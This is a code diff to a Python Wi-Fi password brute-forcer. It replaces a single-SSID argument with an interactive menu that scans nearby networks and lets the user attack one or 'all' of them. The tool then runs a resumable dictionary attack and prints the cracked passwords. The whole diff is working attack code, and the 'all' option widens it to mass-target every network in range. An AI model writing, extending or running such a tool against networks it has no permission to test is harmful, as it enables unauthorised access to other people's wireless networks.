@@ -194,39 +194,42 @@ def main() -> None:
     if not networks:
         raise BruteError("No networks found.")
 
-    if not args.ssid:
-        print("Networks in range:")
-        for n, (ssid, bss) in enumerate(networks.items(), 1):
-            print(f"  {n:2d}  {ssid}  ({len(bss)} APs)")
-        return
+    # ---- scan → liệt kê → chọn số   (giống thoitietv2.py) ----
+    ssid_list = list(networks.keys())
+    print("\n[*] Networks in range:")
+    for idx, ssid in enumerate(ssid_list, 1):
+        print(f"  {idx}) {ssid}  ({len(networks[ssid])} APs)")
 
-    ssid = args.ssid
-    if ssid not in networks:
-        raise BruteError(f"SSID '{ssid}' not found.")
+    choice = input("\nSelect network (number) or type 'all': ").strip()
+    if choice.lower() == "all":
+        todo = ssid_list
+    else:
+        try:
+            todo = [ssid_list[int(choice) - 1]]
+        except (ValueError, IndexError):
+            raise BruteError("Invalid choice.")
+    # -----------------------------------------------------------
 
     passwords = load_dict(args.dict)
-    if not passwords:
-        raise BruteError("Empty dictionary.")
-
     cache = load_cache() if args.resume else {}
-    start = cache.get(ssid, 0)
-    passwords = passwords[start:]
-
-    print(f"Testing {len(passwords)} passwords for '{ssid}' starting at idx={start}")
-    bar = tqdm if tqdm else lambda x, **kw: x
-    with wpa_ctrl(iface):
-        for idx, pwd in bar(enumerate(passwords, start=start), total=len(passwords)):
-            if test_password(iface, ssid, pwd):
-                print(f"\n[+] SUCCESS: {pwd}")
-                cache.pop(ssid, None)
-                save_cache(cache)
-                return
-            cache[ssid] = idx + 1
-            if idx % 10 == 0:  # reduce I/O
-                save_cache(cache)
-    save_cache(cache)
-    print("\n[-] Exhausted dictionary.")
-
+    for ssid in todo:
+        start = cache.get(ssid, 0)
+        cur_passwords = passwords[start:]
+        print(f"\n[*] Testing {len(cur_passwords)} passwords for '{ssid}'")
+        bar = tqdm if tqdm else lambda x, **kw: x
+        with wpa_ctrl(iface):
+            for idx, pwd in bar(enumerate(cur_passwords, start=start),
+                                total=len(cur_passwords)):
+                if test_password(iface, ssid, pwd):
+                    print(f"\n[+] SUCCESS: {ssid} -> {pwd}")
+                    cache.pop(ssid, None)
+                    save_cache(cache)
+                    return
+                cache[ssid] = idx + 1
+                if idx % 10 == 0:
+                    save_cache(cache)
+        save_cache(cache)
+        print(f"\n[-] Exhausted dictionary for {ssid}")
 
 if __name__ == "__main__":
     try:
